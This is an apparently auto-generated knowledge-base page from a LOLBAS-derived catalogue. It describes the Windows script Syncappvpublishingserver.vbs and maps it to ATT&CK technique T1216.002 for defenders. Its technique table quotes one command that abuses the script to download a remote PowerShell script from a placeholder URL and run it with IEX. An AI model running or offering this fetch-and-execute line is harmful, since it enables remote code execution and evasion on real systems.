---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Syncappvpublishingserver.vbs

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `syncappvpublishingserver.vbs` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Syncappvpublishingserver.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Script used related to app-v and publishing server

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/syncappvpublishingserver.vbs.md)
- Source verification: [source record](../../sources/lolbas/syncappvpublishingserver.vbs.md)

## Aliases

- `Syncappvpublishingserver.vbs`
- `syncappvpublishingserver.vbs`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1216.002 - SyncAppvPublishingServer](../../attack/techniques/T1216.002-syncappvpublishingserver.md) | explicit | source | Command metadata lists T1216.002: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') \| IEX" |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/syncappvpublishingserver.vbs.md)

## Source Verification

[source record](../../sources/lolbas/syncappvpublishingserver.vbs.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@monoxgas'
Person: Nick Landers
- Handle: '@subtee'
Person: Casey Smith
Author: Oddvar Moe
Commands:
- Category: Execute
```
